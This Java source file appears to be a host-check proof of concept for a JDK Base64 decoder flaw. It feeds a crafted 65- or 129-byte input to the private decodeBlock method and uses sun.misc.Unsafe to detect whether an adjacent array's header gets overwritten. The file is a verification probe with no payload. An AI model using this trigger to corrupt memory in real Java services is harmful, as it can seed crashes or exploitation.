/*
 * Calif65.java - verify the published 65-byte trigger on this host.
 *
 * Published trigger (Calif / java4shell-poc):
 *   21.0.x / 25 / 27 : "A" x 64 + "="   (65 bytes)
 *   17.0.6+          : "A" x 128 + "="  (129 bytes)
 *
 * Mechanism: decodeBlock reaches the vector tail, output_size = (len/4)*3 - padding,
 * goes negative, BZHI treats the index as unsigned [7:0] so the store mask stays all ones
 * and a full 64-byte store lands past the destination array.
 *
 * This probe allocates dst then a victim array, calls decodeBlock through an exact
 * MethodHandle signature (no boxing), and compares the victim's header words before/after
 * via sun.misc.Unsafe.
 *
 *   java --add-opens java.base/java.util=ALL-UNNAMED Calif65.java [64|128] [runs]
 */
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;

public class Calif65 {

    public static void main(String[] args) throws Exception {
        int n = args.length > 0 ? Integer.parseInt(args[0]) : 64;   // 'A' count
        int runs = args.length > 1 ? Integer.parseInt(args[1]) : 4;
        int srcLen = n + 1;                                          // + "="
        int dstLen = (srcLen / 4) * 3;                               // JDK's own sizing

        System.out.println("jdk=" + System.getProperty("java.version")
                + "  src=" + srcLen + " bytes  dst=" + dstLen + " bytes");

        Class<?> decCls = Class.forName("java.util.Base64$Decoder");
        Base64.Decoder dec = Base64.getDecoder();
        MethodHandles.Lookup lk = MethodHandles.privateLookupIn(decCls, MethodHandles.lookup());
        MethodHandle mh = lk.findVirtual(decCls, "decodeBlock",
                MethodType.methodType(int.class, byte[].class, int.class, int.class,
                        byte[].class, int.class, boolean.class, boolean.class));

        Field uf = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        sun.misc.Unsafe u = (sun.misc.Unsafe) uf.get(null);
        long base = u.arrayBaseOffset(byte[].class);

        byte[] src = new byte[srcLen];
        Arrays.fill(src, (byte) 'A');
        src[srcLen - 1] = '=';

        byte[] scratch = new byte[dstLen];
        for (int i = 0; i < 200_000; i++) {
            try {
                int r = (int) mh.invokeExact(dec, src, 0, srcLen, scratch, 0, false, false);
                if (r < 0) {
                    break;
                }
            } catch (Throwable t) {
                break;
            }
        }
        System.out.println("warmup done");

        for (int r = 0; r < runs; r++) {
            byte[] dst = new byte[dstLen];
            byte[] victim = new byte[64];
            int lenBefore = u.getInt(victim, base - 4);
            int klassBefore = u.getInt(victim, base - 8);

            int ret;
            try {
                ret = (int) mh.invokeExact(dec, src, 0, srcLen, dst, 0, false, false);
            } catch (Throwable t) {
                System.out.println("run " + r + ": threw " + t);
                continue;
            }
            int lenAfter = u.getInt(victim, base - 4);
            int klassAfter = u.getInt(victim, base - 8);
            System.out.printf("run %d ret=%d len %d->%d %s klass %08x->%08x %s%n",
                    r, ret, lenBefore, lenAfter,
                    lenBefore == lenAfter ? "same" : "CHANGED",
                    klassBefore, klassAfter,
                    klassBefore == klassAfter ? "same" : "CHANGED");
        }
        System.out.println("survived");
    }
}
